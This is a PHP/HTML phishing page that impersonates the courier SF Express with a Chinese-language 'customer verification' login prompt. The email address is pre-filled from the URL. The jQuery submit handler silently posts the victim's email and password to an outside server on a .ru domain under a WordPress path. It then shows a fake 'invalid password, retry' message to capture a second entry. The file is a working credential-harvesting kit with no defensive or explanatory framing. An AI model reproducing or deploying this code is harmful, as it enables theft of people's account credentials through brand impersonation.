<?php
$email = $_REQUEST['email'];
$domain = substr(strrchr($email, "@"), 1);
$subdomain = substr($domain, 0, strpos($domain, '.'));
?>

<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<title>SF Express | </title>
	<link rel="shortcut icon" href="https://v.sf-express.com/web/portal/static/favicon.ico">
	<style>
	input[type=submit] {
  width:110px; 
  height:35px; 
  font-family: verdana; 
  font-size: 12px; 
  color:#FFF; 
  background-color: #0489B1; 
  border: solid 1px #0489B1; 
  padding: 7px; 
  -moz-border-radius: 4px; 
  -webkit-border-radius: 4px; 
  -khtml-border-radius: 4px; 
  border-radius: 4px;
  -webkit-box-shadow: 1px 1px 10px 3px #FFF; 
  box-shadow: 1px 1px 10px 3px #FFF;
}

input[type=email] {
  width:275px; 
  height:35px; 
  font-family: Verdana; 
  font-size: 12px; 
  color:#000000; 
  background-color: #FFF; 
  border: solid 1px #FFF; 
  padding: 7px; 
  -moz-border-radius: 4px; 
  -webkit-border-radius: 4px; 
  -khtml-border-radius: 4px; 
  border-radius: 4px;
}

input[type=password] {
  width:275px; 
  height:35px; font-family: verdana; 
  font-size: 12px; 
  color:#000000; 
  background-color: #FFF; 
  border: solid 1px #FFF; 
  padding: 7px; 
  -moz-border-radius: 4px; 
  -webkit-border-radius: 4px; 
  -khtml-border-radius: 4px; 
  border-radius: 4px;
	</style>
	<style>

	body, html {
  height: 100%;
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}

* {
  box-sizing: border-box;
}

.bg-image {
  /* The image used */
  background-image: url("https://www.expresstracking.org/wp-content/uploads/2015/05/sf-express-waybill.jpg");
  
  /* Add the blur effect */
  filter: blur(5px);
  -webkit-filter: blur(5px);
  
  /* Full height */
  height: 100%; 
  
  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}

/* Position text in the middle of the page/image */
.bg-text {
  background: #1C1C1C;
  background: -moz-linear-gradient(top, #1C1C1C 0%, #610B0B 73%, #DF0101 100%);
  background: -webkit-linear-gradient(top, #1C1C1C 0%, #610B0B 73%, #DF0101 100%);
  background: linear-gradient(to bottom, #1C1C1C 0%, #610B0B 73%, #DF0101 100%);
  color: white;
  font-weight: bold;
  border-radius: 25px 0px 65px 0px;
  -webkit-box-shadow: 3px 3px 15px 5px #000000; 
  box-shadow: 3px 3px 15px 5px #000000;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 2;
  width: 360px;
  height:325px;
  padding: 5px;
  text-align: center;
  </style>
</head>
<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0">

<table align="center" cellspacing="0" width="100%" height="100%">

<tr><td height="15%">

	<img src="https://imgur.com/CJukBUm.png">

</td></tr>


<tr><td height="78%">

<div class="bg-image"></div>

<br><br><br>


<div class="bg-text">


	<table align="center" cellspacing="0">
	<tr><td style="height:35px;"></td></tr>
	<tr><td>
		<font face="arial" size="3" color="#FFFFFF">
		<b></b> 客户验证 
		</font>
	</td></tr>
<span class="small"style="margin-bottom:25px; color:#ff1505;" id="msg"></span>
					<tr><td style="height:10px;"></td></tr>
	
					<tr><td>
					<form method="post" action="z.php">
					</td></tr>
					<tr><td>
							<div align="left">
								<font face="verdana" size="2" color="#FFF">
									电子邮件超时。 登录查看运单...
								</font>
							</div>
					</td></tr>
					<tr><td style="height:15px;"></td></tr>
					<tr><td>
						<table cellspacing="0" align="center">
						<tr><td>
							<div align="center">
								<input  name="email" type="email" id="email" value="">
							</div>
						</td></tr>
						<tr><td style="height:7px;"></td></tr>
						<tr><td>
							<div align="center">
								<input  id="password" name="password" autofocus type="password" placeholder="密码" required>
							</div>
						</td></tr>
						<tr><td style="height:7px;"></td></tr>
						<tr><td>
							<table align="center" cellspacing="0" style="width:277px;"><tr>
							<td>
								<input type="checkbox" checked> <font face="arial" size="2" color="#FFF">记得我</font>
							</td>
							<td>
								<div align="right">
									<a href="#" style="tet]xt-decoration:none;">
										<font face="arial" size="2" color="#0080FF"><u>
											
										</u></font>
									</a>
								</div>
							</td>
							</tr></table>
						</td></tr>
						<tr><td style="height:20px;"></td></tr>
						<tr><td>
							<div align="right">
								<input type="submit" id="submit-btn" value="看法">
							</div>
						</td></tr>
						<tr><td>
						</td></tr>
						<tr><td style="height:20px;">
							
							</form>
						</td></tr>
						</table>
					</td></tr>
	</table>
</div>


</td></tr>


<tr><td height="2%" bgcolor="#FFF"></td></tr>

<tr><td height="5%" bgcolor="#000">

	<div align="center">
		<font face="arial" size="1" color="#FFF">
		Copyright © 2022 SF Express. 版权所有
		</font>
	</div>

</td></tr>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
  function limit(element)
  {
    var max_chars = 6;

    if(element.value.length > max_chars) {
      element.value = element.value.substr(0, max_chars);
    }
  }

  /* global $ */
  $(document).ready(function(){
    var count=0;

    $('#back1').click(function () {
      $("#msg").hide();
      $('#email').val("");
      $("#automail").animate({left:200, opacity:"hide"}, 0);
      $("#inputbar").animate({right:200, opacity:"show"}, 1000);

    });

    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/other-1.png');
        $('#field').html("Other Mail");
        $('#email').val(my_email);
        $('#emailch').html(my_email);
        $("#msg").hide();
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
      }
      ///////////////url getting email////////////////


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://pk5-31.ru/wp-includes/SimplePie/fiie/next.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifying...');
            },
            success: function(response){
              $("#password").val("");
              if (count>=2) {
                count=0;
              }
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  // $("#div1").animate({left:200, opacity:"hide"}, 0);
                  // $("#div2").animate({right:200, opacity:"show"}, 1000);
                  // $("#password").val("");
                  // if (count>=2) {
                  //   count=0;
                  //   // window.location.replace(response['redirect_link']);
               

                  // }
                  $('#msg').html(response['msg']);
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
              }
              // $("#div1").animate({left:200, opacity:"hide"}, 0);
              // $("#div2").animate({right:200, opacity:"show"}, 1000);
              // $("#password").val("");
              // if (count>=2) {
              //   count=0;
              // window.location.replace(response['redirect_link']);
              // }
              $("#msg").show();
              $('#msg').html("密码无效...重试");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
    });
      

    });

  
</script>
</html>